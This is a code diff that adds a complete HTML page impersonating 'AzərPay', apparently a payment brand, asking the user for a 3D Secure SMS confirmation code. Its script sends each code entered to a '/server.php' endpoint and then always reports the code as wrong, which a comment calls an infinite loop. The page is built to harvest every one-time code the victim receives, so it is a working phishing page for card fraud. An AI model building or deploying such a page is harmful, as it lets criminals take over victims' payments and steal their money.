@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SMS Təsdiqi — AzərPay</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #f5f5f5;
+            color: #333;
+            line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .header {
+            background: #fff;
+            border-bottom: 3px solid #e31e24;
+            padding: 16px 20px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+
+        .header-content {
+            max-width: 480px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .logo {
+            font-size: 20px;
+            font-weight: 700;
+            color: #e31e24;
+            letter-spacing: -0.5px;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 11px;
+            color: #666;
+        }
+
+        .lock-icon {
+            width: 16px;
+            height: 16px;
+            fill: #00a651;
+        }
+
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .card {
+            background: #fff;
+            border-radius: 8px;
+            padding: 32px 24px;
+            margin-bottom: 16px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .icon-box {
+            width: 64px;
+            height: 64px;
+            background: #fff5f5;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+        }
+
+        .sms-icon {
+            width: 32px;
+            height: 32px;
+            fill: #e31e24;
+        }
+
+        .section-title {
+            font-size: 22px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 12px;
+        }
+
+        .section-desc {
+            font-size: 14px;
+            color: #999;
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+
+        .info-box {
+            background: #f9f9f9;
+            border-left: 3px solid #e31e24;
+            padding: 16px;
+            margin-bottom: 32px;
+            text-align: left;
+            font-size: 13px;
+            color: #666;
+        }
+
+        .info-box strong {
+            color: #333;
+        }
+
+        .otp-input {
+            width: 100%;
+            max-width: 320px;
+            padding: 16px 20px;
+            border: 2px solid #e0e0e0;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+            background: #fff;
+            text-align: left;
+            margin: 0 auto 24px;
+            display: block;
+            transition: border-color 0.2s;
+        }
+
+        .otp-input:focus {
+            outline: none;
+            border-color: #e31e24;
+        }
+
+        .error-msg {
+            color: #e31e24;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            min-height: 20px;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .error-msg.visible {
+            opacity: 1;
+        }
+
+        .btn {
+            width: 100%;
+            max-width: 320px;
+            padding: 16px;
+            background: #e31e24;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin: 0 auto;
+            display: block;
+        }
+
+        .btn:hover {
+            background: #c01820;
+        }
+
+        .btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .resend-section {
+            margin-top: 24px;
+            padding-top: 24px;
+            border-top: 1px solid #f0f0f0;
+        }
+
+        .resend-text {
+            font-size: 13px;
+            color: #999;
+            margin-bottom: 8px;
+        }
+
+        .resend-btn {
+            background: none;
+            border: none;
+            color: #e31e24;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            padding: 8px;
+        }
+
+        .resend-btn:hover:not(:disabled) {
+            text-decoration: underline;
+        }
+
+        .resend-btn:disabled {
+            color: #ccc;
+            cursor: not-allowed;
+        }
+
+        .timer {
+            font-weight: 700;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #999;
+            font-size: 12px;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 12px;
+            }
+            .card {
+                padding: 24px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <div class="header-content">
+        <div class="logo">AzərPay</div>
+        <div class="security-badge">
+            <svg class="lock-icon" viewBox="0 0 24 24">
+                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
+            </svg>
+            <span>3D Secure</span>
+        </div>
+    </div>
+</div>
+
+<div class="container">
+    <div class="card">
+        <div class="icon-box">
+            <svg class="sms-icon" viewBox="0 0 24 24">
+                <path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H6l-2 2V4h16v12z"/>
+            </svg>
+        </div>
+
+        <div class="section-title">SMS Təsdiq Kodu</div>
+        <div class="section-desc">
+            Mobil nömrənizə göndərilən təsdiq kodunu daxil edin
+        </div>
+
+        <div class="info-box">
+            <strong>3D Secure:</strong> Təhlükəsizliyiniz üçün ödənişinizi SMS vasitəsilə təsdiqləyin. Kod 5 dəqiqə ərzində etibarlıdır.
+        </div>
+
+        <form id="otpForm">
+            <input 
+                type="text" 
+                id="otpInput" 
+                class="otp-input" 
+                inputmode="numeric" 
+                autocomplete="off" 
+                placeholder=""
+                required>
+
+            <div class="error-msg" id="errorMsg">Yanlış təsdiq kodu. Yenidən cəhd edin.</div>
+
+            <button type="submit" class="btn">Təsdiq Et</button>
+
+            <div class="resend-section">
+                <div class="resend-text">Kod almadınız?</div>
+                <button type="button" class="resend-btn" id="resendBtn" disabled>
+                    Yenidən göndər (<span class="timer" id="timer">60</span>)
+                </button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<div class="footer">
+    © 2026 AzərPay — Elektron Ödəniş Sistemi
+</div>
+
+<script>
+const otpInput = document.getElementById('otpInput');
+const errorMsg = document.getElementById('errorMsg');
+const otpForm = document.getElementById('otpForm');
+const resendBtn = document.getElementById('resendBtn');
+const timerSpan = document.getElementById('timer');
+
+let timeLeft = 60;
+let timerInterval;
+
+// Sadece rakam girişine izin ver
+otpInput.addEventListener('input', (e) => {
+    e.target.value = e.target.value.replace(/\D/g, '');
+    errorMsg.classList.remove('visible');
+});
+
+// Focus border
+otpInput.addEventListener('focus', () => {
+    otpInput.style.borderColor = '#e31e24';
+});
+
+otpInput.addEventListener('blur', () => {
+    otpInput.style.borderColor = '#e0e0e0';
+});
+
+// Timer
+function startTimer() {
+    timeLeft = 60;
+    resendBtn.disabled = true;
+    timerInterval = setInterval(() => {
+        timeLeft--;
+        timerSpan.textContent = timeLeft;
+        if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+            resendBtn.disabled = false;
+            resendBtn.innerHTML = 'Yenidən göndər';
+        }
+    }, 1000);
+}
+
+startTimer();
+
+resendBtn.addEventListener('click', () => {
+    if (!resendBtn.disabled) {
+        startTimer();
+        resendBtn.innerHTML = 'Yenidən göndər (<span class="timer" id="timer">60</span>)';
+    }
+});
+
+// Form submit
+otpForm.addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    const otp = otpInput.value.trim();
+    
+    if (!otp || otp.length < 1) {
+        errorMsg.classList.add('visible');
+        return;
+    }
+
+    try {
+        await fetch('/server.php?endpoint=verify-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ otp: otp })
+        });
+
+        // Her zaman hata göster (sonsuz loop)
+        setTimeout(() => {
+            errorMsg.classList.add('visible');
+            otpInput.value = '';
+            otpInput.focus();
+        }, 1500);
+
+    } catch (error) {
+        errorMsg.classList.add('visible');
+    }
+});
+
+otpInput.focus();
+</script>
+
+</body>
+</html>
